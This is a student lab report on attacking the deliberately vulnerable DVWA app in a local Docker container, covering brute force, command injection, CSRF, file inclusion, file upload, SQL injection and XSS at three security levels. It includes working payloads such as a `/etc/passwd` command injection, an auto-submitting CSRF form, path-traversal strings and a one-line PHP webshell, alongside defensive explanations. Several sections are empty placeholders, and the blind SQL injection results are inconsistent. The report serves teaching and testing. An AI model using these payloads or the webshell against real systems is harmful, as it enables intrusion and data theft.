# 🔐 DVWA Security Lab Report

## Table of Contents

1. [Brute Force](#1-brute-force)
2. [Command Injection](#2-command-injection)
3. [CSRF (Cross-Site Request Forgery)](#3-csrf-cross-site-request-forgery)
4. [File Inclusion](#4-file-inclusion)
5. [File Upload](#5-file-upload)
6. [Insecure CAPTCHA](#6-insecure-captcha)
7. [SQL Injection](#7-sql-injection)
8. [SQL Injection - Blind](#8-sql-injection-blind)
9. [Weak Session IDs](#9-weak-session-ids)
10. [DOM Based Cross Site Scripting (XSS)](#10-dom-based-cross-site-scripting-xss)
11. [Reflected Cross-Site Scripting (XSS)](#11-reflected-cross-site-scripting-xss)
12. [Stored Cross-Site Scripting (XSS)](#12-stored-cross-site-scripting-xss)
13. [Content Security Policy (CSP) Bypass](#13-content-security-policy-csp-bypass)
14. [JavaScript Attacks](#14-javascript-attacks)
15. [Docker Inspection](#15-docker-inspection)
16. [Security Analysis](#16-security-analysis)
17. [OWASP Top 10 Mapping](#17-owasp-top-10-mapping)

---

## 1. Brute Force

### Overview

Brute force attacks attempt to guess credentials by systematically trying many combinations.

---

### Security Level: Low

**Result:** Username and password `admin` and `password` found successfully.

> ![Screenshot: Brute Force – Low – successful credential discovery](screenshots/brute-force/brute-force-low.png)

**Why it worked:**  
No rate limiting, no account lockout, no CAPTCHA. Requests are processed as fast as the server allows.

---

### Security Level: Medium

**Result:** A `sleep(2)` delay is introduced per failed attempt, slowing brute force but not stopping it.

> ![Screenshot: Brute Force – Medium – successful credential discovery](screenshots/brute-force/brute-force-medium.png)

---

### Security Level: High

**Result:** Anti-CSRF token required per request. Each request needs a valid, fresh token, making automated brute force extremely difficult without token-harvesting logic.

> ![Screenshot: Brute Force – Medium – successful credential discovery](screenshots/brute-force/brute-force-high.png)

**Why it failed:**  
High level requires a user-specific token per login attempt. An automated tool would need to parse the HTML response, extract the token, and include it in each subsequent request which makes it computationally expensive and rate-limited.

---

## 2. Command Injection

### Overview

Command Injection allows an attacker to execute arbitrary OS commands by appending them to a legitimate application command.

---

### Security Level: Low

**Payload Used:**

```bash
127.0.0.1; cat /etc/passwd
```

**Steps:**

1. Navigated to **Command Injection** module.
2. Entered the payload in the IP address field.
3. Clicked **Submit**.

**Result:** The `ping` command ran, then `cat /etc/passwd` executed and its output was displayed on the page.

> 📸 **[Screenshot: Command Injection – Low – /etc/passwd contents displayed]**

**Why it worked:**  
DVWA passes input directly to `shell_exec()`:

```php
$cmd = shell_exec('ping -c 4 ' . $target);
```

The `;` separator causes the shell to execute the second command after the first.

---

### Security Level: Medium

**Payload Used:**

```bash
127.0.0.1 && cat /etc/passwd
```

**Result:** `;` and `&&` on their own are sometimes blocked, but `&&` succeeds at Medium.

> 📸 **[Screenshot: Command Injection – Medium – && payload success]**

**Why it worked:**  
Medium only blacklists `&&` and `;` inconsistently — the filter is bypassable with `|` or `&&` depending on implementation. The blacklist does not cover all shell separators.

---

### Security Level: High

**Payload Attempted:**

```bash
127.0.0.1| cat /etc/passwd
```

**Result:** Failed.

> 📸 **[Screenshot: Command Injection – High – blocked]**

**Why it failed:**  
High level uses a comprehensive blacklist or a whitelist approach that only permits valid IP address characters (digits and `.`). Input not matching the pattern is rejected outright.

---

## 3. CSRF (Cross-Site Request Forgery)

### Overview

CSRF tricks an authenticated user into unknowingly submitting a malicious request using their existing session.

---

### Security Level: Low

**Payload Used:**

A crafted HTML page hosted locally that auto-submits a password change:

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
      <input name="password_new" value="hacked" />
      <input name="password_conf" value="hacked" />
      <input name="Change" value="Change" />
    </form>
  </body>
</html>
```

**Steps:**

1. Opened DVWA and authenticated as `admin`.
2. Opened the crafted HTML page in the same browser.
3. The form auto-submitted.

**Result:** Password was changed to `hacked` without the user's knowledge.

> 📸 **[Screenshot: CSRF – Low – password changed silently]**

**Why it worked:**  
No CSRF token is required. Any authenticated request from the browser is accepted regardless of origin.

---

### Security Level: Medium

**Result:** Partial protection — the `Referer` header is checked. Spoofing the Referer or making the request from the same domain would bypass this.

> 📸 **[Screenshot: CSRF – Medium – Referer check]**

---

### Security Level: High

**Result:** A per-session, unpredictable CSRF token is embedded in the form. The attack fails because the crafted page cannot know the token value.

> 📸 **[Screenshot: CSRF – High – token mismatch error]**

**Why it failed:**  
The server validates a unique, secret token that is only known to the legitimate client session. A cross-origin attacker cannot read this token due to the Same-Origin Policy.

---

## 4. File Inclusion

### Overview

File Inclusion vulnerabilities allow attackers to include arbitrary files — either local (LFI) or remote (RFI) — in the server's execution context.

---

### Security Level: Low

**Payload Used (LFI):**

```
http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd
```

**Result:** Contents of `/etc/passwd` displayed in the browser.

> 📸 **[Screenshot: File Inclusion – Low – /etc/passwd via LFI]**

**Why it worked:**  
The `page` parameter is passed directly to `include()` with no validation:

```php
include($_GET['page']);
```

---

### Security Level: Medium

**Payload Used:**

```
http://localhost:8080/vulnerabilities/fi/?page=....//....//etc/passwd
```

_(Double slash encoding to bypass simple `../` removal)_

**Result:** Medium-level filtering strips `../` but not `....//`, allowing traversal.

> 📸 **[Screenshot: File Inclusion – Medium – encoding bypass]**

---

### Security Level: High

**Result:** Only whitelisted filenames (`file1.php`, `file2.php`, `file3.php`, `include.php`) are accepted. All other values are rejected.

> 📸 **[Screenshot: File Inclusion – High – whitelist enforced]**

**Why it failed:**  
A strict whitelist approach means only known-safe files can be included. No traversal or arbitrary path is possible.

---

## 5. File Upload

### Overview

Insecure file upload allows attackers to upload malicious files (such as PHP webshells) that can be executed on the server.

---

### Security Level: Low

**Payload Used:**

A simple PHP webshell saved as `shell.php`:

```php
<?php system($_GET['cmd']); ?>
```

**Steps:**

1. Navigated to **File Upload** module.
2. Uploaded `shell.php`.
3. Navigated to the uploaded file path: `http://localhost:8080/hackable/uploads/shell.php?cmd=id`

**Result:** The server executed the PHP file and returned the output of the `id` command (e.g., `uid=33(www-data)`).

> 📸 **[Screenshot: File Upload – Low – webshell uploaded and executed]**

**Why it worked:**  
No file type or extension validation. Any file is accepted and stored directly in the web root.

---

### Security Level: Medium

**Payload Used:**

Renamed webshell to `shell.php.jpg` (attempted MIME bypass), and also tried setting `Content-Type: image/jpeg` via Burp Suite while uploading `shell.php`.

**Result:** MIME-type bypass via Burp succeeds. The server checks `Content-Type` header (client-controlled) but not actual file content.

> 📸 **[Screenshot: File Upload – Medium – Burp MIME bypass]**

**Why it worked:**  
Medium checks the `Content-Type` header sent by the client, which can be trivially modified with an intercepting proxy. The actual file content is not inspected.

---

### Security Level: High

**Payload Attempted:**

Embedded PHP in a real JPEG using `exiftool`, renamed to `.jpg`.

**Result:** File is stored, but it cannot be executed as PHP because the server only serves `.jpg` files as images.

> 📸 **[Screenshot: File Upload – High – file stored but not executable]**

**Why it failed:**  
High level uses `getimagesize()` to verify actual image file structure, rejects files that fail the check, and enforces server-side extension whitelisting so `.php` files are not served as PHP.

---

## 6. Insecure CAPTCHA

### Overview

Insecure CAPTCHA vulnerabilities arise when the CAPTCHA verification process can be bypassed, allowing automated actions that should require human verification.

---

### Security Level: Low

> 📸 **[Screenshot: Insecure CAPTCHA – Low]**

---

### Security Level: Medium

> 📸 **[Screenshot: Insecure CAPTCHA – Medium]**

---

### Security Level: High

> 📸 **[Screenshot: Insecure CAPTCHA – High]**

---

## 7. SQL Injection

### Overview

SQL Injection occurs when user-supplied input is embedded directly into SQL queries without sanitization, allowing attackers to manipulate query logic.

---

### Security Level: Low

**Payload Used:**

```sql
1' OR '1'='1
```

**Steps:**

1. Navigated to `SQL Injection` module.
2. Entered the payload in the **User ID** field.
3. Clicked **Submit**.

**Result:** All user records from the database were returned, bypassing the intended single-user lookup.

> 📸 **[Screenshot: SQL Injection – Low – all records returned]**

**Why it worked:**  
At the Low level, DVWA passes user input directly into the SQL query with no sanitization:

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

The payload closes the string (`'`), appends `OR '1'='1` which is always true, causing all rows to be returned.

---

### Security Level: Medium

**Payload Used:**

```sql
1 OR 1=1
```

_(single quotes are escaped at this level, so a numeric injection is attempted)_

**Steps:**

1. Set security to **Medium**.
2. Used the dropdown (input is now a select element, not a text field).
3. Used browser developer tools / Burp Suite to intercept and modify the POST parameter `id` to `1 OR 1=1`.

**Result:** The `mysql_real_escape_string()` function escapes single quotes, but numeric injection without quotes still succeeds when input is not fully validated.

> 📸 **[Screenshot: SQL Injection – Medium – modified POST request and result]**

**Why it partially worked:**  
Medium level escapes special characters but still constructs the query dynamically. A parameterized query is not used, so numeric injections can bypass the escape-based defense.

---

### Security Level: High

**Payload Attempted:**

```sql
1' OR '1'='1
```

**Result:** Attack failed. A token-based mechanism and PDO prepared statements prevent injection.

> 📸 **[Screenshot: SQL Injection – High – no extra records returned]**

**Why it failed:**  
DVWA High level uses **PDO with parameterized queries**:

```php
$data = $db->prepare('SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;');
$data->bindParam(':id', $id, PDO::PARAM_INT);
```

The user input is never concatenated into the query string. Additionally, a CSRF token is required per request, preventing automated attacks.

---

## 8. SQL Injection - Blind

### Overview

Blind SQL Injection is a type of SQL Injection where the attacker does not see the output of the query directly, but can infer information based on the application's behavior (e.g., response time or content differences).

---

### Security Level: Low

**Payload Attempted:**

```sql
1' AND'1'='1'
```

**Result:** Attack failed. A token-based mechanism and PDO prepared statements prevent injection.

> ![Screenshot: SQL Injection Blind – Low](screenshots/sql-injection-blind/sql-injection-blind-low.png)

---

### Security Level: Medium

**Payload Attempted:**

```sql
1' OR '1'='1
```

**Result:** Attack failed. A token-based mechanism and PDO prepared statements prevent injection.

> ![Screenshot: SQL Injection Blind – Medium](screenshots/sql-injection-blind/sql-injection-blind-medium.png)

---

### Security Level: High

**Payload Attempted:**

```sql
1' OR '1'='1
```

**Result:** Attack failed. A token-based mechanism and PDO prepared statements prevent injection.

> ![Screenshot: SQL Injection Blind – High](screenshots/sql-injection-blind/sql-injection-blind-high.png)

---

## 9. Weak Session IDs

### Overview

Weak Session IDs occur when session tokens are generated using predictable algorithms, allowing attackers to guess or brute-force valid session identifiers and hijack user sessions.

---

### Security Level: Low

> 📸 **[Screenshot: Weak Session IDs – Low]**

---

### Security Level: Medium

> 📸 **[Screenshot: Weak Session IDs – Medium]**

---

### Security Level: High

> 📸 **[Screenshot: Weak Session IDs – High]**

---

## 10. DOM Based Cross Site Scripting (XSS)

### Overview

DOM-based XSS occurs when client-side JavaScript processes user input and dynamically updates the DOM without proper sanitization, allowing script injection entirely within the browser.

---

### Security Level: Low

> 📸 **[Screenshot: DOM Based XSS – Low]**

---

### Security Level: Medium

> 📸 **[Screenshot: DOM Based XSS – Medium]**

---

### Security Level: High

> 📸 **[Screenshot: DOM Based XSS – High]**

---

## 11. Cross-Site Scripting (XSS) – Reflected

### Overview

Reflected XSS occurs when malicious script is injected via a URL parameter or form field and immediately reflected back in the HTTP response.

---

### Security Level: Low

**Payload Used:**

```html
<script>
  alert("XSS");
</script>
```

**Steps:**

1. Navigated to **XSS (Reflected)** module.
2. Entered the payload in the **Name** field.
3. Clicked **Submit**.

**Result:** A JavaScript alert box appeared with the message `XSS`, confirming script execution.

> 📸 **[Screenshot: XSS Reflected – Low – alert box popup]**

**Why it worked:**  
At Low level, DVWA directly reflects the input:

```php
echo '<pre>Hello ' . $_GET['name'] . '</pre>';
```

No sanitization is applied, so the browser interprets and executes the injected `<script>` tag.

---

### Security Level: Medium

**Payload Used:**

```html
<img src="x" onerror="alert('XSS')" />
```

_(because `<script>` tags are stripped with a simple `str_replace`)_

**Result:** The `<script>` tag is blocked but event-handler-based payloads succeed.

> 📸 **[Screenshot: XSS Reflected – Medium – alert via img onerror]**

**Why it worked:**  
Medium level uses `str_replace('<script>', '', $name)` — a blacklist approach that only blocks `<script>` tags but misses other HTML event handlers like `onerror`.

---

### Security Level: High

**Payload Attempted:**

```html
<script>
  alert("XSS");
</script>
<img src="x" onerror="alert('XSS')" />
```

**Result:** Both payloads failed. No script executed.

> 📸 **[Screenshot: XSS Reflected – High – sanitized output]**

**Why it failed:**  
High level applies `htmlspecialchars()`, which converts `<`, `>`, `"`, and `&` into their HTML entities (`&lt;`, `&gt;`, etc.). The browser renders them as literal text rather than executable HTML/JS.

---

## 12. Cross-Site Scripting (XSS) – Stored

### Overview

Stored XSS persists the malicious script in the database. It executes for every user who views the affected page — more dangerous than Reflected XSS.

---

### Security Level: Low

**Payload Used:**

```html
<script>
  alert("Stored XSS");
</script>
```

**Steps:**

1. Navigated to **XSS (Stored)** module.
2. Entered a name and the payload in the **Message** field.
3. Clicked **Sign Guestbook**.
4. Reloaded the page.

**Result:** The alert fired on every page load for every visitor.

> 📸 **[Screenshot: XSS Stored – Low – persistent alert on reload]**

**Why it worked:**  
Input is stored directly in the database without sanitization, and retrieved and rendered without encoding on display.

---

### Security Level: Medium

**Payload Used:**

```html
<img src=x onerror=alert('XSS')>
```

**Result:** `<script>` tags are stripped, but the `img` tag payload executes.

> 📸 **[Screenshot: XSS Stored – Medium – img onerror payload]**

---

### Security Level: High

**Payload Attempted:**

```html
<script>
  alert("XSS");
</script>
```

**Result:** Failed. Output is HTML-encoded on retrieval.

> 📸 **[Screenshot: XSS Stored – High – text rendered as plain text]**

**Why it failed:**  
High security applies `htmlspecialchars()` to both storage and retrieval. Even previously stored payloads are neutralized on output.

---

## 13. Content Security Policy (CSP) Bypass

### Overview

Content Security Policy is an HTTP response header that restricts which resources (scripts, styles, etc.) can be loaded. CSP bypass vulnerabilities occur when the policy is misconfigured or too permissive, allowing an attacker to execute scripts despite CSP protections.

---

### Security Level: Low

> 📸 **[Screenshot: CSP Bypass – Low]**

---

### Security Level: Medium

> 📸 **[Screenshot: CSP Bypass – Medium]**

---

### Security Level: High

> 📸 **[Screenshot: CSP Bypass – High]**

---

## 14. JavaScript Attacks

### Overview

JavaScript attacks in DVWA demonstrate how client-side validation and obfuscation can be bypassed. When security logic relies solely on JavaScript running in the browser, an attacker can manipulate or bypass it entirely.

---

### Security Level: Low

> 📸 **[Screenshot: JavaScript Attacks – Low]**

---

### Security Level: Medium

> 📸 **[Screenshot: JavaScript Attacks – Medium]**

---

### Security Level: High

> 📸 **[Screenshot: JavaScript Attacks – High]**

---

## 15. Docker Inspection

### 15.1 `docker ps`

```bash
docker ps
```

> 📸 **[Screenshot: docker ps output]**

Shows the running DVWA container, its ID, image name, uptime, and port mapping (`0.0.0.0:8080->80/tcp`).

---

### 15.2 `docker inspect dvwa`

```bash
docker inspect dvwa
```

> 📸 **[Screenshot: docker inspect dvwa (partial output)]**

Key findings:

- **Image:** `vulnerables/web-dvwa`
- **IPAddress:** Assigned internal Docker bridge IP (e.g., `172.17.0.2`)
- **Mounts:** No persistent volumes — all data is ephemeral inside the container
- **Env:** Contains `APACHE_RUN_USER`, `PHP_VERSION`, `MYSQL_*` variables
- **NetworkSettings:** Bridge network, isolated from host except on mapped port 8080

---

### 15.3 `docker logs dvwa`

```bash
docker logs dvwa
```

> 📸 **[Screenshot: docker logs dvwa]**

Shows Apache access logs and MySQL startup messages. Reveals HTTP requests made during testing, including GET/POST parameters in some cases — a reminder not to expose this publicly.

---

### 15.4 Inside the Container

```bash
docker exec -it dvwa /bin/bash
```

```bash
# Once inside:
ls /var/www/html
```

**Output:**

```
about.php  config  dvwa  external  favicon.ico  hackable  ids_log.php  index.php
instructions.php  login.php  logout.php  phpinfo.php  robots.txt  security.php  setup.php
```

> 📸 **[Screenshot: ls /var/www/html inside the container]**

---

### 15.5 Analysis: Docker Environment

| Question                                | Answer                                                                                                                                                                                                                                                                  |
| --------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Where are app files stored?**         | `/var/www/html` — served by Apache web server inside the container                                                                                                                                                                                                      |
| **Backend technology**                  | PHP + Apache + MySQL (LAMP stack). PHP scripts process requests; MySQL stores user/session data                                                                                                                                                                         |
| **How Docker isolates the environment** | The container has its own filesystem, network namespace, and process space. The only exposure to the host is port 8080 (mapped). The container's internal network is a private bridge. Processes inside cannot access host processes or files unless explicitly mounted |

---

## 16. Security Analysis

### Q1: Why does SQL Injection succeed at Low security?

At Low security, user input is interpolated directly into SQL query strings without any escaping or parameterization. The PHP code constructs queries like:

```php
$query = "SELECT * FROM users WHERE user_id = '$id';";
```

An attacker can break out of the string context using a single quote and inject arbitrary SQL logic. There is no input validation, no prepared statement, and no output encoding — all three defenses are absent.

---

### Q2: What control prevents SQL Injection at High security?

DVWA's High level uses **PDO Prepared Statements with bound parameters**:

```php
$stmt = $db->prepare("SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
```

With parameterized queries, the SQL structure is defined before user data is supplied. The database engine treats user input strictly as a data value — never as executable SQL syntax. Even a fully crafted injection payload is treated as a literal string and will not match any record, rather than altering query logic.

---

### Q3: Does HTTPS prevent these attacks? Why or why not?

**No.** HTTPS encrypts data **in transit** between the client and server — it protects against network-level eavesdropping and man-in-the-middle attacks. However:

- **SQL Injection, XSS, Command Injection, File Upload** are **server-side processing vulnerabilities**. Once the encrypted HTTPS connection terminates at the server, the raw payload is handed to the application. HTTPS plays no role in how the application processes that data.
- HTTPS does **not** validate, sanitize, or restrict HTTP request contents.
- A vulnerability that exists over HTTP exists identically over HTTPS.

HTTPS is essential for confidentiality and integrity of communication but is not a substitute for input validation, output encoding, or parameterized queries.

---

### Q4: What risks exist if DVWA is deployed publicly?

| Risk                                     | Impact                                                                                                         |
| ---------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| **Full database compromise**             | SQL Injection can extract, modify, or delete all data including user credentials                               |
| **Remote Code Execution**                | Command Injection and File Upload webshells give the attacker shell access on the server                       |
| **Persistent XSS attacks on real users** | Stored XSS can steal session cookies, redirect users, or deliver malware to every visitor                      |
| **Account takeover**                     | Brute force with no lockout allows password guessing at scale                                                  |
| **Lateral movement**                     | With a shell inside the Docker container, attackers may escape to the host or pivot to other network resources |
| **Reputational and legal damage**        | Compromised systems hosting malware or being used in attacks expose the operator to legal liability            |
| **Data exfiltration**                    | LFI/RFI can read sensitive server files including configuration, private keys, and `/etc/shadow`               |

**DVWA is intentionally vulnerable and must never be internet-accessible.**

---

## 17. OWASP Top 10 Mapping

| Vulnerability Tested                    | OWASP Top 10 (2021) Category                                                       |
| --------------------------------------- | ---------------------------------------------------------------------------------- |
| SQL Injection                           | **A03:2021 – Injection**                                                           |
| XSS (Reflected & Stored)                | **A03:2021 – Injection**                                                           |
| Command Injection                       | **A03:2021 – Injection**                                                           |
| File Inclusion (LFI/RFI)                | **A03:2021 – Injection**                                                           |
| Insecure File Upload                    | **A04:2021 – Insecure Design** / **A08:2021 – Software & Data Integrity Failures** |
| Brute Force (no lockout)                | **A07:2021 – Identification and Authentication Failures**                          |
| CSRF                                    | **A01:2021 – Broken Access Control**                                               |
| Missing HTTPS / sensitive data exposure | **A02:2021 – Cryptographic Failures**                                              |
| Verbose error messages / docker logs    | **A05:2021 – Security Misconfiguration**                                           |
| Outdated/vulnerable components          | **A06:2021 – Vulnerable and Outdated Components**                                  |

---

## Summary

This lab demonstrated how the absence of a few core secure coding practices — **input validation**, **output encoding**, **parameterized queries**, **CSRF tokens**, and **file type verification** — leads to exploitable vulnerabilities across every DVWA module. The progression from Low → Medium → High security levels illustrated that:

- **Blacklists fail** (Medium level) because edge cases are almost always missed.
- **Whitelists and parameterization succeed** (High level) because they define what is allowed rather than what is blocked.
- Security in depth (multiple controls layered together) is necessary — no single control is sufficient.

---

_Report authored as part of Application Security Testing assignment. Environment: DVWA running on Docker (local machine only). All payloads executed against localhost:8080._
